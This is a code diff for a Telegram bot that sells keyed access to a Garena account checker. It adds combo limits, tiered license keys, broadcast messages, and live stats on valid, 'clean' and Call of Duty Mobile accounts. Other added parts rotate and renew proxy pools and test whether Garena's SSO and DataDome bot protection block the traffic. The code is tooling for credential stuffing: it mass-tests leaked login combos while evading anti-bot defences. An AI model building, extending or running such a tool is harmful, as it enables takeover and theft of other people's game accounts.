+                type_counts[proxy_type] = type_counts.get(proxy_type, 0) + 1
+            except Exception:
+                continue
+
+        # Write all new proxies
+        if new_proxies:
+            with open(RAW_PROXY_SAVE_FILE, "a", encoding="utf-8") as f:
+                for p in new_proxies:
+                    f.write(p + "\n")
+
+    # Step 7: Reload the pool from disk (only the new file exists now)
+    try:
+        geo_rotator._load_all_files()
+    except Exception as e:
+        log.error(f"[RENEW-PROXY] Failed to reload pool: {e}")
+
+    # Step 8: Persist
+    try:
+        _persist_proxies()
+    except Exception:
+        pass
+
+    pool_now = geo_rotator.total
+
+    # Build result message
+    type_str = " | ".join(f"{t}: {c}" for t, c in type_counts.items() if c > 0)
+    if fetch_errors:
+        err_str = "\n".join(f"  ❌ {e}" for e in fetch_errors)
+        _tg_send(token, chat_id,
+            f"⚠️ <b>Proxy Renewal — Partial Failure</b>\n\n"
+            f"🗑️ Old proxies deleted: <code>{old_count}</code>\n"
+            f"✅ New proxies fetched: <code>{len(new_proxies)}</code>\n"
+            f"📊 Types: <code>{type_str}</code>\n"
+            f"📡 Proxy pool now: <code>{pool_now}</code>\n\n"
+            f"<b>Errors:</b>\n{err_str}")
+    else:
+        _tg_send(token, chat_id,
+            f"✅ <b>Proxy Renewal Complete!</b>\n\n"
+            f"🗑️ Old proxies deleted: <code>{old_count}</code>\n"
+            f"🔄 Fetched from: <code>worker-production-a615.up.railway.app</code>\n"
+            f"✅ New proxies added: <code>{len(new_proxies)}</code>\n"
+            f"📊 Types: <code>{type_str}</code>\n"
+            f"📡 Proxy pool now: <code>{pool_now}</code>")
+
+
+def _handle_check(token: str, chat_id, from_user: dict, sub_cmd: str = ""):
+    """
+    /check         — full overview (level + country + server)
+    /check level   — level distribution only
+    /check country — country distribution only
+    /check server  — server/region distribution only
+    """
+    # Find the user's active checker live_stats
+    bar = _active_bars.get(chat_id, {})
+    ls = bar.get("live_stats")
+
+    if not ls:
+        _tg_send(token, chat_id,
+            "ℹ️ <b>No active checker running.</b>\n\n"
+            "Start a checker first, then use /check to see live stats.")
+        return
+
+    with ls.lock:
+        done = ls.total_processed
+        total = ls.total_accounts
+        pct = (done / total * 100) if total > 0 else 0
+        speed_str = f"{ls.current_speed:.1f}/s" if ls.current_speed > 0 else "..."
+        eta_str = ls.format_time(ls.eta_seconds) if ls.eta_seconds else "N/A"
+        elapsed_str = ls.format_time(time.time() - ls.start_time) if ls.start_time else "0s"
+
+        level_dist = dict(ls.level_distribution)
+        server_dist = dict(ls.server_distribution)
+        country_dist = dict(ls.country_distribution)
+        valid = ls.valid_count
+        invalid = ls.invalid_count
+        clean = ls.clean_count
+        not_clean = ls.not_clean_count
+        has_codm = ls.has_codm_count
+        no_codm = ls.no_codm_count
+
+    sub = sub_cmd.lower().strip()
+
+    # ── Header (always shown) ──────────────────────────────
+    header = (
+        f"📊 <b>Checker Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏳ Progress: <code>{done:,}/{total:,}</code> ({pct:.1f}%)\n"
+        f"⚡ Speed: <code>{speed_str}</code> | ETA: <code>{eta_str}</code>\n"
+        f"🕐 Elapsed: <code>{elapsed_str}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Valid: <code>{valid:,}</code> | ❌ Invalid: <code>{invalid:,}</code>\n"
+        f"✨ Clean: <code>{clean:,}</code> | ⚠️ Not Clean: <code>{not_clean:,}</code>\n"
+        f"🎮 CODM: <code>{has_codm:,}</code> | 📭 No CODM: <code>{no_codm:,}</code>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+    )
+
+    sections = []
+
+    # ── Level Distribution ──────────────────────────────────
+    if sub in ("", "level", "lvl"):
+        total_with_level = sum(level_dist.values())
+        if total_with_level > 0:
+            lvl_lines = ["📊 <b>Level Distribution</b>"]
+            for rk in ["1-50", "51-100", "101-150", "151-200",
+                        "201-250", "251-300", "301-350", "351+"]:
+                cnt = level_dist.get(rk, 0)
+                p = (cnt / total_with_level * 100) if total_with_level > 0 else 0
+                bar_str = _text_bar(cnt, total_with_level, 10)
+                lvl_lines.append(f"  {rk:<7} : [{bar_str}] {cnt} ({p:.1f}%)")
+            sections.append("\n".join(lvl_lines))
+        elif sub in ("level", "lvl"):
+            sections.append("📊 <i>No level data yet.</i>")
+
+    # ── Country Distribution ────────────────────────────────
+    if sub in ("", "country"):
+        if country_dist:
+            sorted_c = sorted(country_dist.items(), key=lambda x: x[1], reverse=True)
+            total_c = sum(v for _, v in sorted_c)
+            c_lines = ["🌍 <b>Country Distribution</b>"]
+            for cname, cnt in sorted_c[:20]:
+                p = (cnt / total_c * 100) if total_c > 0 else 0
+                bar_str = _text_bar(cnt, total_c, 10)
+                c_lines.append(f"  {cname:<5} : [{bar_str}] {cnt} ({p:.1f}%)")
+            if len(sorted_c) > 20:
+                others = sum(v for _, v in sorted_c[20:])
+                c_lines.append(f"  Other : {others} ({others/total_c*100:.1f}%)")
+            sections.append("\n".join(c_lines))
+        elif sub == "country":
+            sections.append("🌍 <i>No country data yet.</i>")
+
+    # ── Server/Region Distribution ──────────────────────────
+    if sub in ("", "server", "region"):
+        if server_dist:
+            sorted_s = sorted(server_dist.items(), key=lambda x: x[1], reverse=True)
+            total_s = sum(v for _, v in sorted_s)
+            s_lines = ["🌏 <b>Server Distribution</b>"]
+            for region, cnt in sorted_s:
+                p = (cnt / total_s * 100) if total_s > 0 else 0
+                bar_str = _text_bar(cnt, total_s, 10)
+                s_lines.append(f"  {region:<5} : [{bar_str}] {cnt} ({p:.1f}%)")
+            sections.append("\n".join(s_lines))
+        elif sub in ("server", "region"):
+            sections.append("🌏 <i>No server data yet.</i>")
+
+    body = header
+    if sections:
+        body += "\n".join(sections)
+    else:
+        body += "<i>No distribution data yet — check back after more accounts are processed.</i>"
+
+    body += (
+        f"\n━━━━━━━━━━━━━━━━━━━━\n"
+        f"<i>💡 /check level · /check country · /check server</i>"
+    )
+
+    _tg_send(token, chat_id, body)
+
+
+def _text_bar(value: int, maximum: int, width: int = 10) -> str:
+    """Generate a simple text bar like ███░░░░░░░"""
+    if maximum <= 0:
+        return "░" * width
+    filled = int(value / maximum * width)
+    return "█" * filled + "░" * (width - filled)
 
 
 # ── update router ──────────────────────────────────────────────
@@ -5200,7 +8285,15 @@ def _handle_help(token: str, chat_id, from_user: dict):
                     {"text": "🔄 Refresh Panel",   "callback_data": "admin:refresh"},
                 ],
                 [
+                    {"text": "🗑️ Delete Proxies",  "callback_data": "admin:deleteproxy"},
+                    {"text": "🔄 Renew Proxies",   "callback_data": "admin:renewproxy"},
+                ],
+                [
                     {"text": "📊 Server Status",   "callback_data": "admin:serverstatus"},
+                    {"text": "🧵 Set Threads",     "callback_data": "admin:setthreads"},
+                ],
+                [
+                    {"text": "👥 Set Max Users",    "callback_data": "admin:setmaxusers"},
                 ],
             ]
         )
@@ -5370,25 +8463,18 @@ def _handle_callback_query(token: str, cq: dict):
     # ── Admin panel button routing ─────────────────────────────
     if data == "admin:genkey":
         if not _is_owner(from_user): return
-        _genkey_wizard[chat_id] = {"step": "AWAIT_DURATION"}
+        _genkey_wizard[chat_id] = {"step": "AWAIT_TIER"}
         _tg_send_buttons(token, chat_id,
-            "🔑 <b>Generate Key — Step 1 of 4</b>\n\n"
-            "⏳ How long should the key be valid?\n\n"
-            "<i>Tap a button or type a custom duration</i>",
+            "🔑 <b>Generate Key — Step 1 of 6</b>\n\n"
+            "🏷 <b>Select Tier:</b>\n\n"
+            "<i>Free = basic access  |  VIP = premium access + more threads</i>",
             [
                 [
-                    {"text": "1 Hour",   "callback_data": "gk_dur:3600"},
-                    {"text": "6 Hours",  "callback_data": "gk_dur:21600"},
-                    {"text": "12 Hours", "callback_data": "gk_dur:43200"},
+                    {"text": "🆓 Free",  "callback_data": "gk_tier:free"},
+                    {"text": "⭐ VIP",   "callback_data": "gk_tier:vip"},
                 ],
                 [
-                    {"text": "1 Day",    "callback_data": "gk_dur:86400"},
-                    {"text": "3 Days",   "callback_data": "gk_dur:259200"},
-                    {"text": "7 Days",   "callback_data": "gk_dur:604800"},
-                ],
-                [
-                    {"text": "30 Days",  "callback_data": "gk_dur:2592000"},
-                    {"text": "❌ Cancel","callback_data": "gk_cancel"},
+                    {"text": "❌ Cancel", "callback_data": "gk_cancel"},
                 ],
             ]
         )
@@ -5417,6 +8503,16 @@ def _handle_callback_query(token: str, cq: dict):
         _handle_server_status(token, chat_id, from_user)
         return
 
+    if data == "admin:setthreads":
+        if not _is_owner(from_user): return
+        _handle_set_threads(token, chat_id, from_user, "")
+        return
+
+    if data == "admin:setmaxusers":
+        if not _is_owner(from_user): return
+        _handle_set_max_users(token, chat_id, from_user, "")
+        return
+
     if data == "admin:proxystatus":
         if not _is_owner(from_user): return
         _handle_proxy_status(token, chat_id, from_user)
@@ -5428,6 +8524,18 @@ def _handle_callback_query(token: str, cq: dict):
         _proxy_msg_ids.pop(chat_id, None)
         _bot_state[chat_id] = "AWAIT_PROXY"
         _handle_proxy_upload(token, chat_id, from_user, {})
+        return
+
+    if data == "admin:deleteproxy":
+        if not _is_owner(from_user): return
+        _handle_delete_proxy(token, chat_id, from_user)
+        return
+
+    if data == "admin:renewproxy":
+        if not _is_owner(from_user): return
+        def _run_renew_cb():
+            _handle_renew_proxy(token, chat_id, from_user)
+        threading.Thread(target=_run_renew_cb, daemon=True).start()
         return
 
     if data == "admin:refresh":
@@ -5486,6 +8594,7 @@ def _handle_callback_query(token: str, cq: dict):
         deleted = []
         for k in list(sel):
             if k in keys:
+                _delete_key_from_api(keys[k])
                 deleted.append(k)
                 del keys[k]
         _save_keys(keys)
@@ -5510,41 +8619,78 @@ def _handle_callback_query(token: str, cq: dict):
     if data == "dk_noop":
         return
 
-    # ── Genkey wizard — duration chosen → ask users ───────────
-    if data.startswith("gk_dur:"):
+    # ── Genkey wizard — Tier selected → ask Format ──────────────
+    if data.startswith("gk_tier:"):
         if not _is_owner(from_user): return
-        duration = int(data.split(":")[1])
-        _genkey_wizard[chat_id] = {"step": "AWAIT_USERS", "duration": duration}
-        _ask_genkey_users(token, chat_id, duration)
+        tier = data.split(":")[1]
+        _genkey_wizard[chat_id] = {"step": "AWAIT_FORMAT", "tier": tier}
+        _ask_genkey_format(token, chat_id)
         return
 
-    # ── Genkey wizard — users chosen → ask limit ──────────────
-    if data.startswith("gk_usr:"):
+    # ── Genkey wizard — Format selected → ask Expiry ──────────
+    if data.startswith("gk_fmt:"):
         if not _is_owner(from_user): return
         wiz = _genkey_wizard.get(chat_id, {})
-        if not wiz or wiz.get("step") != "AWAIT_USERS":
+        if not wiz or wiz.get("step") != "AWAIT_FORMAT":
             _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
             return
-        max_users        = int(data.split(":")[1])
-        wiz["step"]      = "AWAIT_LIMIT"
-        wiz["max_users"] = max_users
-        _ask_genkey_limit(token, chat_id, wiz["duration"], max_users)
+        wiz["format"] = data.split(":")[1]
+        wiz["step"] = "AWAIT_EXPIRY"
+        _ask_genkey_expiry(token, chat_id)
         return
 
-    # ── Genkey wizard — limit chosen → ask count ──────────────
+    # ── Genkey wizard — Expiry (days) selected → ask Combo Limit
+    if data.startswith("gk_exp:"):
+        if not _is_owner(from_user): return
+        wiz = _genkey_wizard.get(chat_id, {})
+        if not wiz or wiz.get("step") != "AWAIT_EXPIRY":
+            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
+            return
+        wiz["expiry_days"] = int(data.split(":")[1])
+        wiz["expiry_seconds"] = wiz["expiry_days"] * 86400
+        wiz["step"] = "AWAIT_COMBO"
+        _ask_genkey_combo(token, chat_id)
+        return
+
+    # ── Genkey wizard — Expiry (hours) selected → ask Combo Limit
+    if data.startswith("gk_exp_h:"):
+        if not _is_owner(from_user): return
+        wiz = _genkey_wizard.get(chat_id, {})
+        if not wiz or wiz.get("step") != "AWAIT_EXPIRY":
+            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
+            return
+        hours = int(data.split(":")[1])
+        wiz["expiry_seconds"] = hours * 3600
+        wiz["expiry_days"] = 0  # sub-day
+        wiz["step"] = "AWAIT_COMBO"
+        _ask_genkey_combo(token, chat_id)
+        return
+
+    # ── Genkey wizard — Combo selected → ask Max Redemptions ──
     if data.startswith("gk_lim:"):
         if not _is_owner(from_user): return
         wiz = _genkey_wizard.get(chat_id, {})
-        if not wiz or wiz.get("step") != "AWAIT_LIMIT":
+        if not wiz or wiz.get("step") != "AWAIT_COMBO":
             _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
             return
-        limit = int(data.split(":")[1])
-        wiz["step"]        = "AWAIT_COUNT"
-        wiz["combo_limit"] = limit
-        _ask_genkey_count(token, chat_id, wiz["duration"], wiz["max_users"], limit)
+        wiz["combo_limit"] = int(data.split(":")[1])
+        wiz["step"] = "AWAIT_REDEEMS"
+        _ask_genkey_redeems(token, chat_id)
         return
 
-    # ── Genkey wizard — count chosen → finalize ───────────────
+    # ── Genkey wizard — Redeems selected → ask Count ──────────
+    if data.startswith("gk_usr:"):
+        if not _is_owner(from_user): return
+        wiz = _genkey_wizard.get(chat_id, {})
+        if not wiz or wiz.get("step") != "AWAIT_REDEEMS":
+            _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
+            return
+        wiz["max_redemptions"] = int(data.split(":")[1])
+        wiz["step"] = "AWAIT_COUNT"
+        _ask_genkey_count(token, chat_id)
+        return
+
+    # ── Genkey wizard — Count chosen → finalize ───────────────
     if data.startswith("gk_cnt:"):
         if not _is_owner(from_user): return
         wiz = _genkey_wizard.get(chat_id, {})
@@ -5552,7 +8698,17 @@ def _handle_callback_query(token: str, cq: dict):
             _tg_send(token, chat_id, "⚠️ Session expired. Use /generate_key again.")
             return
         count = int(data.split(":")[1])
-        _finalize_gen_key(token, chat_id, wiz["duration"], wiz["combo_limit"], count, wiz["max_users"])
+        _finalize_gen_key(
+            token, chat_id,
+            tier=wiz.get("tier", "vip"),
+            key_format=wiz.get("format", "alphanum"),
+            expiry_days=wiz.get("expiry_days", 30),
+            combo_limit=wiz.get("combo_limit", 1000),
+            max_redemptions=wiz.get("max_redemptions", 1),
+            count=count,
+            label=wiz.get("label", ""),
+            expiry_seconds=wiz.get("expiry_seconds", 0),
+        )
         return
 
     # ── Cancel genkey wizard ───────────────────────────────────
@@ -5597,6 +8753,8 @@ def _handle_callback_query(token: str, cq: dict):
         else:
             target_id = int(data.split(":")[1])
 
+        # Also clear proxy-paused state if they're waiting
+        _unregister_proxy_paused(target_id)
         evt = _stop_events.get(target_id)
         if evt and not evt.is_set():
             evt.set()
@@ -5672,6 +8830,7 @@ def _handle_callback_query(token: str, cq: dict):
         thresholds, label = level_map[val]
         d = _udata(chat_id)
         d["level"] = thresholds
+        _save_profile(chat_id, d)  # auto-save level immediately
         _ask_filter(token, chat_id, label)
         return
 
@@ -5722,6 +8881,81 @@ def _handle_callback_query(token: str, cq: dict):
             _tg_delete_messages_bulk(token, chat_id, msg_ids)
         _tg_send(token, chat_id, "🗑 <b>Proxy upload cancelled.</b> Accumulator cleared.")
         return
+
+    # ── Broadcast callback buttons ──────────────────────────────────────────
+    if data == "broadcast:done":
+        if not _is_owner(from_user): return
+        _flush_broadcast_accumulator(token, chat_id, from_user)
+        return
+
+    if data == "broadcast:cancel":
+        if not _is_owner(from_user): return
+        _broadcast_accumulator.pop(chat_id, None)
+        _bot_state.pop(chat_id, None)
+        _tg_send(token, chat_id, "🗑 <b>Broadcast cancelled.</b> Message discarded.")
+        return
+
+
+def _send_broadcast(token: str, chat_id, from_user: dict, message_text: str):
+    """Send a broadcast message to all registered bot users."""
+    target_ids = set()
+    for k, v in _saved_users.items():
+        if isinstance(v, dict):
+            _cid = v.get("hits_id")
+            if _cid:
+                try:
+                    target_ids.add(int(_cid))
+                except (ValueError, TypeError):
+                    pass
+    # Also add chat_ids from _user_data (in case not yet saved)
+    for _cid in _user_data:
+        try:
+            target_ids.add(int(_cid))
+        except (ValueError, TypeError):
+            pass
+    # Remove owner from targets
+    try:
+        owner_id = int(OWNER_ID) if OWNER_ID else None
+        if owner_id: target_ids.discard(owner_id)
+    except (ValueError, TypeError):
+        pass
+    if not target_ids:
+        _tg_send(token, chat_id, "📢 <b>No users to broadcast to.</b>")
+        return
+    owner_name = from_user.get("first_name", "Owner")
+    broadcast_msg = (
+        f"📢 <b>Announcement from {owner_name}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{message_text}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"<i>— Bot Admin</i>"
+    )
+    sent_ok, sent_fail = 0, 0
+    for tid in target_ids:
+        try:
+            _tg_send(token, tid, broadcast_msg)
+            sent_ok += 1
+            time.sleep(0.05)  # rate-limit: ~20 msg/sec
+        except Exception:
+            sent_fail += 1
+    _tg_send(token, chat_id,
+        f"📢 <b>Broadcast Complete!</b>\n\n"
+        f"✅ <b>Delivered:</b> {sent_ok}\n"
+        f"❌ <b>Failed:</b> {sent_fail}\n"
+        f"👥 <b>Total users:</b> {len(target_ids)}")
+
+
+def _flush_broadcast_accumulator(token: str, chat_id, from_user: dict):
+    """Send the accumulated broadcast message to all users and clean up."""
+    lines = _broadcast_accumulator.pop(chat_id, [])
+    _bot_state.pop(chat_id, None)
+    if not lines:
+        _tg_send(token, chat_id,
+            "⚠️ <b>No message to broadcast.</b>\n"
+            "Type your message first, then tap Done.")
+        return
+    message_text = "\n".join(lines)
+    _send_broadcast(token, chat_id, from_user, message_text)
 
 
 def handle_bot_update(token: str, update: dict, _unused_config):
@@ -5778,43 +9012,69 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
     # ── Intercept text replies for genkey wizard ───────────────
     if _is_owner(from_user) and chat_id in _genkey_wizard:
         wiz = _genkey_wizard[chat_id]
-        if wiz["step"] == "AWAIT_DURATION" and text and not text.startswith("/"):
-            dur = _parse_duration(text)
-            if dur > 0:
-                wiz["step"]     = "AWAIT_USERS"
-                wiz["duration"] = dur
-                _ask_genkey_users(token, chat_id, dur)
+        # Custom expiry input (e.g. "1d", "12h", "2w 3d", "1mo", "6h30m")
+        if wiz["step"] == "AWAIT_EXPIRY" and text and not text.startswith("/"):
+            secs = _parse_duration(text)
+            if secs > 0:
+                wiz["expiry_seconds"] = secs
+                wiz["expiry_days"] = secs // 86400 if secs >= 86400 else 0
+                wiz["step"] = "AWAIT_COMBO"
+                _ask_genkey_combo(token, chat_id)
+            elif text.strip() == "0" or text.strip().lower() == "never":
+                wiz["expiry_seconds"] = 0
+                wiz["expiry_days"] = 0
+                wiz["step"] = "AWAIT_COMBO"
+                _ask_genkey_combo(token, chat_id)
             else:
                 _tg_send(token, chat_id,
-                    "❌ Invalid format. Try: <code>1d</code>  <code>12hrs</code>  <code>45min</code>")
+                    "❌ Invalid format. Examples:\n"
+                    "<code>1d</code> = 1 day\n"
+                    "<code>12h</code> = 12 hours\n"
+                    "<code>1d12h</code> = 1 day 12 hours\n"
+                    "<code>2w</code> = 2 weeks\n"
+                    "<code>3mo</code> = 3 months\n"
+                    "<code>0</code> or <code>never</code> = no expiry")
             return
-        if wiz["step"] == "AWAIT_USERS" and text and not text.startswith("/"):
-            try:
-                max_users = int(text.strip())
-                if max_users < 0: raise ValueError
-                wiz["step"]      = "AWAIT_LIMIT"
-                wiz["max_users"] = max_users
-                _ask_genkey_limit(token, chat_id, wiz["duration"], max_users)
-            except ValueError:
-                _tg_send(token, chat_id,
-                    "❌ Enter a number (e.g. <code>10</code>) or <code>0</code> for unlimited.")
-            return
-        if wiz["step"] == "AWAIT_LIMIT" and text and not text.startswith("/"):
+        # Custom combo limit input
+        if wiz["step"] == "AWAIT_COMBO" and text and not text.startswith("/"):
             try:
                 limit = int(text.strip())
                 if limit < 0: raise ValueError
-                wiz["step"]        = "AWAIT_COUNT"
                 wiz["combo_limit"] = limit
-                _ask_genkey_count(token, chat_id, wiz["duration"], wiz["max_users"], limit)
+                wiz["step"] = "AWAIT_REDEEMS"
+                _ask_genkey_redeems(token, chat_id)
             except ValueError:
                 _tg_send(token, chat_id,
-                    "❌ Please enter a valid number (e.g. <code>1000</code>) or <code>0</code> for unlimited.")
+                    "❌ Enter a number (e.g. <code>2500</code>) or <code>0</code> for unlimited.")
             return
+        # Custom max redemptions input
+        if wiz["step"] == "AWAIT_REDEEMS" and text and not text.startswith("/"):
+            try:
+                max_r = int(text.strip())
+                if max_r < 0: raise ValueError
+                wiz["max_redemptions"] = max_r
+                wiz["step"] = "AWAIT_COUNT"
+                _ask_genkey_count(token, chat_id)
+            except ValueError:
+                _tg_send(token, chat_id,
+                    "❌ Enter a number (e.g. <code>25</code>) or <code>0</code> for unlimited.")
+            return
+        # Custom count input
         if wiz["step"] == "AWAIT_COUNT" and text and not text.startswith("/"):
             try:
                 count = int(text.strip())
                 if count < 1 or count > 500: raise ValueError
-                _finalize_gen_key(token, chat_id, wiz["duration"], wiz["combo_limit"], count, wiz["max_users"])
+                _finalize_gen_key(
+                    token, chat_id,
+                    tier=wiz.get("tier", "vip"),
+                    key_format=wiz.get("format", "alphanum"),
+                    expiry_days=wiz.get("expiry_days", 30),
+                    combo_limit=wiz.get("combo_limit", 1000),
+                    max_redemptions=wiz.get("max_redemptions", 1),
+                    count=count,
+                    label=wiz.get("label", ""),
+                    expiry_seconds=wiz.get("expiry_seconds", 0),
+                )
             except ValueError:
                 _tg_send(token, chat_id,
                     "❌ Enter a number between <code>1</code> and <code>500</code>.")
@@ -5823,6 +9083,11 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
     # ── /stop — shows interactive stop panel ──────────────────
     if cmd == "stop":
         _handle_stop_panel(token, chat_id, from_user)
+        return
+
+    # ── /check — live checker stats (level, country, server) ──
+    if cmd == "check":
+        _handle_check(token, chat_id, from_user, cmd_args)
         return
 
     # ── Owner-only commands ────────────────────────────────────
@@ -5868,6 +9133,97 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
             _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
             return
         _handle_proxy_status(token, chat_id, from_user)
+        return
+
+    if cmd == "testproxy":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        # Run connectivity test in background to avoid blocking
+        def _run_proxy_test():
+            results = []
+            # Test direct connection
+            try:
+                resp = requests.get(
+                    "https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1",
+                    timeout=8, allow_redirects=False
+                )
+                if resp.status_code == 200:
+                    results.append("🌐 Direct: ✅ OK (no DataDome block)")
+                elif resp.status_code == 403:
+                    results.append("🌐 Direct: 🛡️ DataDome blocked (403)")
+                else:
+                    results.append(f"🌐 Direct: ⚠️ HTTP {resp.status_code}")
+            except Exception as e:
+                results.append(f"🌐 Direct: ❌ {str(e)[:50]}")
+            
+            # Test DataDome cookie fetch
+            try:
+                sess = requests.Session()
+                sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+                dd = get_datadome_cookie(sess)
+                if dd:
+                    results.append(f"🍪 DataDome: ✅ Cookie obtained")
+                else:
+                    results.append("🍪 DataDome: ❌ Failed to get cookie")
+                sess.close()
+            except Exception as e:
+                results.append(f"🍪 DataDome: ❌ {str(e)[:50]}")
+            
+            # Test a few proxies from the pool
+            pool_size = geo_rotator.total
+            if pool_size > 0:
+                test_count = min(3, pool_size)
+                working = 0
+                tested = 0
+                for i in range(test_count):
+                    try:
+                        proxy_dict = geo_rotator.get_proxies()
+                        if not proxy_dict:
+                            break
+                        sess = requests.Session()
+                        sess.proxies.update(proxy_dict)
+                        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+                        resp = sess.get(
+                            "https://dd.garena.com/js/",
+                            timeout=6, allow_redirects=False
+                        )
+                        if resp.status_code in (200, 403):
+                            working += 1
+                        tested += 1
+                        sess.close()
+                        geo_rotator.smart_rotate()
+                    except Exception:
+                        tested += 1
+                        geo_rotator.smart_rotate()
+                results.append(f"🔄 Proxies: {working}/{tested} working (pool: {pool_size})")
+            else:
+                results.append("🔄 Proxies: ⚠️ Pool is empty!")
+            
+            _tg_send(token, chat_id,
+                f"🧪 <b>Proxy Connectivity Test</b>\n\n" +
+                "\n".join(results)
+            )
+        
+        threading.Thread(target=_run_proxy_test, daemon=True).start()
+        _tg_send(token, chat_id, "🧪 <b>Running proxy test...</b> (results in ~10s)")
+        return
+
+    if cmd == "deleteproxy":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        _handle_delete_proxy(token, chat_id, from_user)
+        return
+
+    if cmd == "renewproxy":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        # Run in background thread since it makes HTTP requests
+        def _run_renew_proxy():
+            _handle_renew_proxy(token, chat_id, from_user)
+        threading.Thread(target=_run_renew_proxy, daemon=True).start()
         return
 
     if cmd == "add_coowner":
@@ -5946,6 +9302,14 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
         _handle_server_status(token, chat_id, from_user)
         return
 
+    if cmd == "setthreads":
+        _handle_set_threads(token, chat_id, from_user, cmd_args)
+        return
+
+    if cmd == "setmaxusers":
+        _handle_set_max_users(token, chat_id, from_user, cmd_args)
+        return
+
     if cmd == "resetconfig":
         if not _is_owner(from_user):
             _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
@@ -5953,11 +9317,17 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
         # Delete config.json so next restart triggers the wizard again
         if os.path.exists(CONFIG_FILE):
             os.remove(CONFIG_FILE)
+        # Also clear KeyVault config state (Railway persistence)
+        try:
+            if api and api.enabled:
+                api.delete_state("bot_config")
+        except Exception:
+            pass
         _tg_send(token, chat_id,
             "🗑 <b>Config deleted!</b>\n\n"
-            "Restart the bot — it will ask for your token and owner ID again.")
+            "On local: restart the bot \u2014 it will ask for your token and owner ID again.\n"
+            "On Railway: set BOT_TOKEN and OWNER_ID env vars, then redeploy.")
         return
-
     if cmd == "stopall":
         if not _is_owner(from_user):
             _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
@@ -5975,6 +9345,26 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
             _tg_send(token, chat_id, "ℹ️ No checkers are currently running.")
         return
 
+    # ── /broadcast ── owner sends a message to all users (with Done button) ──
+    if cmd == "broadcast":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        _broadcast_accumulator.pop(chat_id, None)   # clear any old session
+        _bot_state[chat_id] = "AWAIT_BROADCAST"
+        _tg_send_buttons(token, chat_id,
+            "📢 <b>Broadcast Mode</b>\n\n"
+            "Type your message below. You can send multiple messages.\n"
+            "When done, tap <b>✅ Done</b> to send to all users.\n\n"
+            "<i>Your next message will start the broadcast text.</i>",
+            [
+                [
+                    {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
+                    {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
+                ],
+            ])
+        return
+
     if cmd == "statuskey":
         if not _is_owner(from_user):
             _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
@@ -5987,6 +9377,13 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
             _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
             return
         _handle_delete_key(token, chat_id, from_user, cmd_args)
+        return
+
+    if cmd == "keysystem":
+        if not _is_owner(from_user):
+            _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+            return
+        _handle_keysystem_config(token, chat_id, from_user, cmd_args)
         return
 
     # ── Proxy file upload state ────────────────────────────────
@@ -6022,6 +9419,39 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
                     bot_reply["result"]["message_id"])
         return
 
+    # ── Broadcast message accumulation ──────────────────────────────────────
+    if _bot_state.get(chat_id) == "AWAIT_BROADCAST":
+        if not _is_owner(from_user):
+            _bot_state.pop(chat_id, None)
+            _broadcast_accumulator.pop(chat_id, None)
+            return
+        if cmd in ("done", "broadcast_done") or text.lower() == "done":
+            _flush_broadcast_accumulator(token, chat_id, from_user)
+        elif text and not text.startswith("/"):
+            if chat_id not in _broadcast_accumulator:
+                _broadcast_accumulator[chat_id] = []
+            _broadcast_accumulator[chat_id].append(text)
+            count_lines = len(_broadcast_accumulator[chat_id])
+            _tg_send_buttons(token, chat_id,
+                f"📝 <b>Message received!</b> Lines so far: <code>{count_lines}</code>\n"
+                f"<i>Keep typing more, or tap Done to send to all users.</i>",
+                [
+                    [
+                        {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
+                        {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
+                    ],
+                ])
+        else:
+            _tg_send_buttons(token, chat_id,
+                "📢 <b>Broadcast Mode</b>\n\nType your message, or tap Done/Cancel:",
+                [
+                    [
+                        {"text": "✅ Done (send broadcast)", "callback_data": "broadcast:done"},
+                        {"text": "🗑 Cancel", "callback_data": "broadcast:cancel"},
+                    ],
+                ])
+        return
+
     # ── /start — always allowed, no key required ─────────────
     # CRITICAL: /start must never be blocked — it is how new users
     # arrive and how they reach /redeem to get a key.
@@ -6033,12 +9463,25 @@ def _handle_bot_update_inner(token: str, update: dict, _unused_config):
     if cmd == "reset":
         key_id = str(from_user.get("id", chat_id))
         uname  = from_user.get("username", "")
+        # ── Preserve key & expiry before clearing ────────────────────
+        old_d       = _user_data.get(chat_id, {})
+        saved_key   = old_d.get("key") or (_saved_users.get(key_id) or {}).get("key")
